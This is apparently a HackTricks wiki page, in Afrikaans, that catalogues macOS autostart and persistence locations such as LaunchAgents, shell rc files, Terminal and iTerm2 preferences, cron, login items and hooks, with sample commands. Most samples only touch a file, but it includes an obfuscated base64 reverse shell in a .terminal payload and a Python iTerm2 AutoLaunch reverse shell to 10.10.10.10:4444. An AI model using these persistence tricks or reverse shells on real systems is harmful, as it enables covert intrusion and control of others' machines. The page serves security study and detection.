# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Hierdie afdeling is sterk gebaseer op die blogreeks [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), die doel is om **meer Autostart Plekke** by te voeg (indien moontlik), aan te dui **watter tegnieke steeds werk** vandag met die nuutste weergawe van macOS (13.4) en om die **toestemmings** wat benodig word, te spesifiseer.

## Sandbox Bypass

> [!TIP]
> Hier kan jy start plekke vind wat nuttig is vir **sandbox bypass** wat jou toelaat om eenvoudig iets uit te voer deur dit **in 'n lêer te skryf** en **te wag** vir 'n baie **gewone** **aksie**, 'n bepaalde **hoeveelheid tyd** of 'n **aksie wat jy gewoonlik kan uitvoer** van binne 'n sandbox sonder om root-toestemmings te benodig.

### Launchd

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Plekke

- **`/Library/LaunchAgents`**
- **Trigger**: Herlaai
- Root benodig
- **`/Library/LaunchDaemons`**
- **Trigger**: Herlaai
- Root benodig
- **`/System/Library/LaunchAgents`**
- **Trigger**: Herlaai
- Root benodig
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Herlaai
- Root benodig
- **`~/Library/LaunchAgents`**
- **Trigger**: Herlog-in
- **`~/Library/LaunchDemons`**
- **Trigger**: Herlog-in

> [!TIP]
> As 'n interessante feit, **`launchd`** het 'n ingebedde eiendomslys in die Mach-o afdeling `__Text.__config` wat ander bekende dienste bevat wat launchd moet begin. Boonop kan hierdie dienste die `RequireSuccess`, `RequireRun` en `RebootOnSuccess` bevat wat beteken dat hulle uitgevoer en suksesvol voltooi moet word.
>
> Natuurlik, dit kan nie gewysig word nie weens kode ondertekening.

#### Beskrywing & Exploitatie

**`launchd`** is die **eerste** **proses** wat deur die OX S-kern by opstart uitgevoer word en die laaste een wat by afsluiting voltooi. Dit moet altyd die **PID 1** hê. Hierdie proses sal **lees en uitvoer** die konfigurasies wat in die **ASEP** **plists** aangedui word in:

- `/Library/LaunchAgents`: Per-gebruiker agente geïnstalleer deur die admin
- `/Library/LaunchDaemons`: Stelselwye demone geïnstalleer deur die admin
- `/System/Library/LaunchAgents`: Per-gebruiker agente verskaf deur Apple.
- `/System/Library/LaunchDaemons`: Stelselwye demone verskaf deur Apple.

Wanneer 'n gebruiker aanmeld, word die plists geleë in `/Users/$USER/Library/LaunchAgents` en `/Users/$USER/Library/LaunchDemons` begin met die **aangemelde gebruikers se toestemmings**.

Die **hoofdifferensie tussen agente en demone is dat agente gelaai word wanneer die gebruiker aanmeld en die demone gelaai word by stelselaanvang** (aangesien daar dienste soos ssh is wat uitgevoer moet word voordat enige gebruiker toegang tot die stelsel het). Ook kan agente GUI gebruik terwyl demone in die agtergrond moet loop.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Daar is gevalle waar 'n **agent uitgevoer moet word voordat die gebruiker aanmeld**, hierdie word **PreLoginAgents** genoem. Byvoorbeeld, dit is nuttig om assistiewe tegnologie by aanmelding te bied. Hulle kan ook gevind word in `/Library/LaunchAgents` (sien [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) 'n voorbeeld).

> [!NOTE]
> Nuwe Daemons of Agents konfigurasie lêers sal **gelaai word na die volgende herlaai of deur** `launchctl load <target.plist>` Dit is **ook moontlik om .plist lêers sonder daardie uitbreiding** te laai met `launchctl -F <file>` (maar daardie plist lêers sal nie outomaties gelaai word na herlaai).\
> Dit is ook moontlik om te **ontlaai** met `launchctl unload <target.plist>` (die proses waarna verwys word sal beëindig word),
>
> Om te **verseker** dat daar nie **iets** (soos 'n oorskryding) is wat 'n **Agent** of **Daemon** **verhinder** om **te loop** nie, voer in: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Lys al die agente en daemons wat deur die huidige gebruiker gelaai is:
```bash
launchctl list
```
> [!WARNING]
> As 'n plist aan 'n gebruiker behoort, selfs al is dit in 'n daemon stelselswye vouers, sal die **taak as die gebruiker uitgevoer word** en nie as root nie. Dit kan sommige voorregverhoging aanvalle voorkom.

#### Meer inligting oor launchd

**`launchd`** is die **eerste** gebruikersmodus proses wat van die **kernel** begin. Die proses begin moet **suksesvol** wees en dit **kan nie verlaat of crash nie**. Dit is selfs **beskerm** teen sommige **doodmaak seine**.

Een van die eerste dinge wat `launchd` sou doen, is om **alle** **daemons** soos:

- **Timer daemons** gebaseer op tyd om uitgevoer te word:
- atd (`com.apple.atrun.plist`): Het 'n `StartInterval` van 30min
- crond (`com.apple.systemstats.daily.plist`): Het `StartCalendarInterval` om om 00:15 te begin
- **Netwerk daemons** soos:
- `org.cups.cups-lpd`: Luister in TCP (`SockType: stream`) met `SockServiceName: printer`
- SockServiceName moet óf 'n poort óf 'n diens van `/etc/services` wees
- `com.apple.xscertd.plist`: Luister op TCP in poort 1640
- **Pad daemons** wat uitgevoer word wanneer 'n spesifieke pad verander:
- `com.apple.postfix.master`: Kontroleer die pad `/etc/postfix/aliases`
- **IOKit kennisgewing daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: Dit dui in die `MachServices` inskrywing die naam `com.apple.xscertd.helper`
- **UserEventAgent:**
- Dit is anders as die vorige een. Dit laat launchd toe om toepassings te laat ontstaan in reaksie op spesifieke gebeurtenisse. In hierdie geval is die hoof binêre betrokke nie `launchd` nie, maar `/usr/libexec/UserEventAgent`. Dit laai plugins van die SIP beperkte vouer /System/Library/UserEventPlugins/ waar elke plugin sy inisialisator in die `XPCEventModuleInitializer` sleutel aandui of, in die geval van ouer plugins, in die `CFPluginFactories` dict onder die sleutel `FB86416D-6164-2070-726F-70735C216EC0` van sy `Info.plist`.

### shell opstartlêers

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC Omseiling: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet 'n toepassing vind met 'n TCC omseiling wat 'n shell uitvoer wat hierdie lêers laai

#### Plekke

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: Maak 'n terminal met zsh oop
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: Maak 'n terminal met zsh oop
- Root benodig
- **`~/.zlogout`**
- **Trigger**: Verlaat 'n terminal met zsh
- **`/etc/zlogout`**
- **Trigger**: Verlaat 'n terminal met zsh
- Root benodig
- Potensieel meer in: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: Maak 'n terminal met bash oop
- `/etc/profile` (het nie gewerk nie)
- `~/.profile` (het nie gewerk nie)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: Verwag om met xterm te trigger, maar dit **is nie geïnstalleer nie** en selfs nadat dit geïnstalleer is, word hierdie fout gegooi: xterm: `DISPLAY is not set`

#### Beskrywing & Exploitatie

Wanneer 'n shell omgewing soos `zsh` of `bash` geinitieer word, **word sekere opstartlêers uitgevoer**. macOS gebruik tans `/bin/zsh` as die standaard shell. Hierdie shell word outomaties toeganklik wanneer die Terminal-toepassing gelaai word of wanneer 'n toestel via SSH benader word. Terwyl `bash` en `sh` ook in macOS teenwoordig is, moet hulle eksplisiet aangeroep word om gebruik te word.

Die manbladsy van zsh, wat ons kan lees met **`man zsh`**, het 'n lang beskrywing van die opstartlêers.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Heropen Toepassings

> [!WAARSKUWING]
> Die konfigurasie van die aangeduide uitbuiting en afteken en aanmeld of selfs herlaai het nie vir my gewerk om die app uit te voer nie. (Die app is nie uitgevoer nie, miskien moet dit loop wanneer hierdie aksies uitgevoer word)

**Skrywe**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: Herbegin heropen toepassings

#### Beskrywing & Uitbuiting

Al die toepassings om te heropen is binne die plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

So, om die heropen toepassings jou eie te laat begin, moet jy net **jou app by die lys voeg**.

Die UUID kan gevind word deur daardie gids te lys of met `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Om die toepassings wat heropen gaan word te kontroleer, kan jy doen:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Om **'n toepassing by hierdie lys te voeg** kan jy gebruik maak van:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Voorkeure

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
- Terminal gebruik om FDA-toestemmings van die gebruiker te hê

#### Ligging

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Open Terminal

#### Beskrywing & Exploitatie

In **`~/Library/Preferences`** word die voorkeure van die gebruiker in die Toepassings gestoor. Sommige van hierdie voorkeure kan 'n konfigurasie hou om **ander toepassings/scripte uit te voer**.

Byvoorbeeld, die Terminal kan 'n opdrag in die Opstart uitvoer:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Hierdie konfig is in die lêer **`~/Library/Preferences/com.apple.Terminal.plist`** soos volg weerspieël:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
So, as die plist van die voorkeure van die terminal in die stelsel oorgeskryf kan word, kan die **`open`** funksionaliteit gebruik word om die **terminal te open en daardie opdrag sal uitgevoer word**.

Jy kan dit vanaf die cli byvoeg met:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Skripte / Ander lêer uitbreidings

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
- Terminal gebruik om FDA toestemmings van die gebruiker te hê

#### Ligging

- **Enige plek**
- **Trigger**: Open Terminal

#### Beskrywing & Exploitatie

As jy 'n [**`.terminal`** skrip](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) skep en dit oopmaak, sal die **Terminal toepassing** outomaties geaktiveer word om die opdragte wat daar aangedui is, uit te voer. As die Terminal app sekere spesiale voorregte het (soos TCC), sal jou opdrag met daardie spesiale voorregte uitgevoer word.

Probeer dit met:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
U kan ook die uitbreidings **`.command`**, **`.tool`**, met gewone skaal skripte-inhoud gebruik en hulle sal ook deur Terminal geopen word.

> [!CAUTION]
> As terminal **Volledige Skyf Toegang** het, sal dit in staat wees om daardie aksie te voltooi (let daarop dat die uitgevoerde opdrag in 'n terminalvenster sigbaar sal wees).

### Klank Plugins

Skrywe: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Skrywe: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC omseiling: [🟠](https://emojipedia.org/large-orange-circle)
- U mag ekstra TCC-toegang kry

#### Ligging

- **`/Library/Audio/Plug-Ins/HAL`**
- Wortel benodig
- **Trigger**: Herbegin coreaudiod of die rekenaar
- **`/Library/Audio/Plug-ins/Components`**
- Wortel benodig
- **Trigger**: Herbegin coreaudiod of die rekenaar
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Herbegin coreaudiod of die rekenaar
- **`/System/Library/Components`**
- Wortel benodig
- **Trigger**: Herbegin coreaudiod of die rekenaar

#### Beskrywing

Volgens die vorige skrywes is dit moontlik om **sekere klank plugins te compileer** en hulle te laat laai.

### QuickLook Plugins

Skrywe: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC omseiling: [🟠](https://emojipedia.org/large-orange-circle)
- U mag ekstra TCC-toegang kry

#### Ligging

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Beskrywing & Exploitatie

QuickLook plugins kan uitgevoer word wanneer u **die voorvertoning van 'n lêer aktiveer** (druk spasie met die lêer in Finder gekies) en 'n **plugin wat daardie lêer tipe ondersteun** is geïnstalleer.

Dit is moontlik om u eie QuickLook plugin te compileer, dit in een van die vorige liggings te plaas om dit te laai en dan na 'n ondersteunde lêer te gaan en spasie te druk om dit te aktiveer.

### ~~Inlog/Uitlog Hooks~~

> [!CAUTION]
> Dit het nie vir my gewerk nie, nie met die gebruiker LoginHook of met die wortel LogoutHook nie

**Skrywe**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- U moet in staat wees om iets soos `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` uit te voer
- `Lo`k in `~/Library/Preferences/com.apple.loginwindow.plist`

Hulle is verouderd, maar kan gebruik word om opdragte uit te voer wanneer 'n gebruiker aanmeld.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Hierdie instelling word gestoor in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Om dit te verwyder:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Die wortel gebruiker een word gestoor in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Voorwaardelike Sandbox Omseiling

> [!TIP]
> Hier kan jy begin plekke vind wat nuttig is vir **sandbox omseiling** wat jou toelaat om eenvoudig iets uit te voer deur dit **in 'n lêer te skryf** en **nie super algemene toestande** te verwag nie, soos spesifieke **programme geïnstalleer, "ongewone" gebruiker** aksies of omgewings.

### Cron

**Skrywe**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Jy moet egter in staat wees om die `crontab` binêre uit te voer
- Of wees wortel
- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Plek

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Wortel benodig vir direkte skrywe toegang. Geen wortel benodig as jy `crontab <file>` kan uitvoer nie
- **Trigger**: Hang af van die cron werk

#### Beskrywing & Exploitatie

Lys die cron werke van die **huidige gebruiker** met:
```bash
crontab -l
```
U kan ook al die cron take van die gebruikers in **`/usr/lib/cron/tabs/`** en **`/var/at/tabs/`** sien (benodig root).

In MacOS kan verskeie vouers wat skripte met **sekere frekwensie** uitvoer, gevind word in:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Daar kan jy die gewone **cron** **take**, die **at** **take** (nie baie gebruik nie) en die **periodieke** **take** (hoofsaaklik gebruik vir die skoonmaak van tydelike lêers) vind. Die daaglikse periodieke take kan byvoorbeeld uitgevoer word met: `periodic daily`.

Om 'n **gebruikers cronjob programmaties** by te voeg, is dit moontlik om te gebruik:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 het voorheen TCC-toestemmings toegestaan

#### Plekke

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: Maak iTerm oop
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: Maak iTerm oop
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: Maak iTerm oop

#### Beskrywing & Exploitatie

Scripts gestoor in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** sal uitgevoer word. Byvoorbeeld:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
of:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Die skrif **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** sal ook uitgevoer word:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Die iTerm2 voorkeure geleë in **`~/Library/Preferences/com.googlecode.iterm2.plist`** kan **'n opdrag aandui om uit te voer** wanneer die iTerm2 terminal geopen word.

Hierdie instelling kan in die iTerm2 instellings gekonfigureer word:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

En die opdrag word in die voorkeure weerspieël:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Jy kan die opdrag stel om uit te voer met:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Hoog waarskynlik is daar **ander maniere om die iTerm2 voorkeure** te misbruik om arbitrêre opdragte uit te voer.

### xbar

Skrywe: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar xbar moet geïnstalleer wees
- TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
- Dit vra Toeganklikheid toestemmings

#### Ligging

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: Sodra xbar uitgevoer word

#### Beskrywing

As die gewilde program [**xbar**](https://github.com/matryer/xbar) geïnstalleer is, is dit moontlik om 'n shell-skrip in **`~/Library/Application\ Support/xbar/plugins/`** te skryf wat uitgevoer sal word wanneer xbar begin:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Skrywe**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar Hammerspoon moet geïnstalleer wees
- TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
- Dit vra Toeganklikheid toestemmings

#### Ligging

- **`~/.hammerspoon/init.lua`**
- **Trigger**: Sodra hammerspoon uitgevoer word

#### Beskrywing

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dien as 'n outomatiseringsplatform vir **macOS**, wat die **LUA-skriptingtaal** vir sy operasies benut. Dit ondersteun die integrasie van volledige AppleScript-kode en die uitvoering van skulp-skripte, wat sy skriptingvermoëns aansienlik verbeter.

Die app soek na 'n enkele lêer, `~/.hammerspoon/init.lua`, en wanneer dit begin word, sal die skrip uitgevoer word.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar BetterTouchTool moet geïnstalleer wees
- TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
- Dit vra Automatisering-Snelkoppeling en Toeganklikheid toestemmings

#### Plek

- `~/Library/Application Support/BetterTouchTool/*`

Hierdie hulpmiddel laat toe om toepassings of skripte aan te dui wat uitgevoer moet word wanneer sekere snelkoppelinge gedruk word. 'n Aanvaller mag in staat wees om sy eie **snelkoppeling en aksie in die databasis te konfigureer** om dit te laat uitvoer willekeurige kode (n snelkoppeling kan net wees om 'n sleutel te druk).

### Alfred

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar Alfred moet geïnstalleer wees
- TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
- Dit vra Automatisering, Toeganklikheid en selfs Volle Skyf toegang toestemmings

#### Plek

- `???`

Dit laat toe om werksvloeie te skep wat kode kan uitvoer wanneer sekere voorwaardes nagekom word. Potensieel is dit moontlik vir 'n aanvaller om 'n werksvloei-lêer te skep en Alfred te laat laai (dit is nodig om die premium weergawe te betaal om werksvloeie te gebruik).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar ssh moet geaktiveer en gebruik word
- TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
- SSH gebruik om FDA toegang te hê

#### Plek

- **`~/.ssh/rc`**
- **Trigger**: Inlog via ssh
- **`/etc/ssh/sshrc`**
- Root benodig
- **Trigger**: Inlog via ssh

> [!CAUTION]
> Om ssh aan te skakel vereis Volle Skyf Toegang:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Beskrywing & Exploit

Standaard, tensy `PermitUserRC no` in `/etc/ssh/sshd_config`, wanneer 'n gebruiker **inlog via SSH** sal die skripte **`/etc/ssh/sshrc`** en **`~/.ssh/rc`** uitgevoer word.

### **Inlogitems**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet `osascript` met args uitvoer
- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Plekke

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Inlog
- Exploit payload gestoor wat **`osascript`** aanroep
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Inlog
- Root benodig

#### Beskrywing

In Stelsels Voorkeure -> Gebruikers & Groepe -> **Inlogitems** kan jy **items vind wat uitgevoer moet word wanneer die gebruiker inlog**.\
Dit is moontlik om hulle te lys, by te voeg en te verwyder vanaf die opdraglyn:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Hierdie items word gestoor in die lêer **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Aanmelditems** kan **ook** aangedui word deur die API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) wat die konfigurasie in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** sal stoor.

### ZIP as Aanmelditem

(Kyk na die vorige afdeling oor Aanmelditems, dit is 'n uitbreiding)

As jy 'n **ZIP** lêer as 'n **Aanmelditem** stoor, sal die **`Archive Utility`** dit oopmaak en as die zip byvoorbeeld gestoor is in **`~/Library`** en die gids **`LaunchAgents/file.plist`** met 'n backdoor bevat, sal daardie gids geskep word (dit is nie standaard nie) en die plist sal bygevoeg word sodat die volgende keer wanneer die gebruiker weer aanmeld, die **backdoor aangedui in die plist sal uitgevoer word**.

Nog 'n opsie sou wees om die lêers **`.bash_profile`** en **`.zshenv`** binne die gebruiker se HOME te skep, sodat as die gids LaunchAgents reeds bestaan, hierdie tegniek steeds sal werk.

### At

Skrywe: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Nuttig om die sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet **`at`** **uitvoer** en dit moet **geaktiveer** wees
- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Moet **`at`** **uitvoer** en dit moet **geaktiveer** wees

#### **Beskrywing**

`at` take is ontwerp vir **die skedulering van eenmalige take** om op sekere tye uitgevoer te word. Anders as cron take, word `at` take outomaties verwyder na uitvoering. Dit is belangrik om te noem dat hierdie take volhardend is oor stelsels herlaai, wat hulle as potensiële sekuriteitskwessies onder sekere omstandighede merk.

Deur **standaard** is hulle **deaktiveer** maar die **root** gebruiker kan **hulle** **aktiveer** met:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Dit sal 'n lêer in 1 uur skep:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Kontroleer die werkskuil met `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Boven kan ons twee geplande werke sien. Ons kan die besonderhede van die werk druk met `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
